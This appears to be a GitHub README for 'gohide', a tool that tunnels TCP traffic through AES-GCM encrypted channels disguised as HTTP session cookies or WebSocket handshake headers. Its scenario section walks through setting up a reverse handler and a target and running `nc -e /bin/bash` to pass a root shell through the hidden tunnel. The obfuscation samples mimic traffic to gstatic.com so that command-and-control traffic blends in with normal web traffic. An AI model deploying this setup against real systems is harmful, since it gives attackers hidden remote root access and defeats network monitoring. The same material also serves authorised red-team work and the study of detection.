# gohide 

Tunnel TCP port to port traffic via an obfuscated channel with AES-GCM encryption. 

**Obfuscation Modes**
- Session Cookie HTTP GET (http-client)
- Set-Cookie Session Cookie HTTP/2 200 OK (http-server) 
- WebSocket Handshake "Sec-WebSocket-Key" (websocket-client)
- WebSocket Handshake "Sec-WebSocket-Accept" (websocket-server)
- No obfuscation, just use AES-GCM encrypted messages (none)

AES-GCM is enabled by default for each of the options above.

**Usage**
```
root@WOPR-KALI:/opt/gohide# ./gohide -h
Usage of ./gohide:
  -f string
    	listen fake server -r x.x.x.x:xxxx (ip/domain:port) (default "0.0.0.0:8081")
  -k openssl passwd -1 -salt ok | md5sum
    	aes encryption secret: run with '-k openssl passwd -1 -salt ok | md5sum' to derive key from password without exposing to command line (default "5fe10ae58c5ad02a6113305f4e702d07")
  -l string
    	listen port forward -l x.x.x.x:xxxx (ip/domain:port) (default "127.0.0.1:8080")
  -m string
    	obfuscation mode (AES encrypted by default): websocket-client, websocket-server, http-client, http-server, none (default "none")
  -r string
    	forward to remote fake server -r x.x.x.x:xxxx (ip/domain:port) (default "127.0.0.1:9999")
```

**Scenario**

Box A - Reverse Handler.

```
root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:8081 -l 127.0.0.1:8080 -r 127.0.0.1:9091 -m websocket-client
Local Port Forward Listening: 127.0.0.1:8080
FakeSrv Listening: 0.0.0.0:8081
```
Box B - Target.
```
root@WOPR-KALI:/opt/gohide# ./gohide -f 0.0.0.0:9091 -r 127.0.0.1:8081 -l 127.0.0.1:9090 -m websocket-server
Local Port Forward Listening: 127.0.0.1:9090
FakeSrv Listening: 0.0.0.0:9091

```
Box B - Netcat /bin/bash

```
root@WOPR-KALI:/var/tmp# nc -e /bin/bash 127.0.0.1 9090

```
Box A - Netcat client
```
root@WOPR-KALI:/opt/gohide# nc -v 127.0.0.1 8080
localhost [127.0.0.1] 8080 (http-alt) open
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux WOPR-KALI 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-1kali1 (2019-11-11) x86_64 GNU/Linux
netstat -pantwu 
Active Internet connections (servers and established)
tcp        0      0 127.0.0.1:39684         127.0.0.1:8081          ESTABLISHED 14334/./gohide      

```
**Obfuscation Samples**

websocket-client (Box A to Box B)
- Sec-WebSocket-Key contains AES-GCM encrypted content e.g. "uname -a".
```
GET /news/api/latest HTTP/1.1
Host: cdn-tb0.gstatic.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: 6jZS+0Wg1IP3n33RievbomIuvh5ZdNMPjVowXm62
Sec-WebSocket-Version: 13
```

websocket-server (Box B to Box A)
- Sec-WebSocket-Accept contains AES-GCM encrypted output.
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: URrP5l0Z3NIHXi+isjuIyTSKfoP60Vw5d2gqcmI=
```
http-client
- Session cookie header contains AES-GCM encrypted content
```
GET /news/api/latest HTTP/1.1
Host: cdn-tbn0.gstatic.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://www.bbc.co.uk/
Connection: keep-alive
Cookie: Session=R7IJ8y/EBgCanTo6fc0fxhNVDA27PFXYberJNW29; Secure; HttpOnly
```
http-server
- Set-Cookie header contains AES-GCM encrypted content.
```
HTTP/2.0 200 OK
content-encoding: gzip
content-type: text/html; charset=utf-8
pragma: no-cache
server: nginx
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
cache-control: no-cache, no-store, must-revalidate
expires: Thu, 21 Nov 2019 01:07:15 GMT
date: Thu, 21 Nov 2019 01:07:15 GMT
content-length: 30330
vary: Accept-Encoding
X-Firefox-Spdy: h2
Set-Cookie: Session=gWMnQhh+1vkllaOxueOXx9/rLkpf3cmh5uUCmHhy; Secure; Path=/; HttpOnly

```

none
```
8JWxXufVora2FNa/8m2Vnub6oiA2raV4Q5tUELJA
```

![Screenshot from 2019-11-21 02-26-30](https://user-images.githubusercontent.com/56988989/69298676-804ba680-0c06-11ea-84f6-2a32c48a3ba0.png)

![Screenshot from 2019-11-21 16-40-07](https://user-images.githubusercontent.com/56988989/69357798-a3656d00-0c7d-11ea-9db9-d3fe5d2e9ccf.png)


Future
- Fix up error handling.
- Add TLS.

Enjoy~
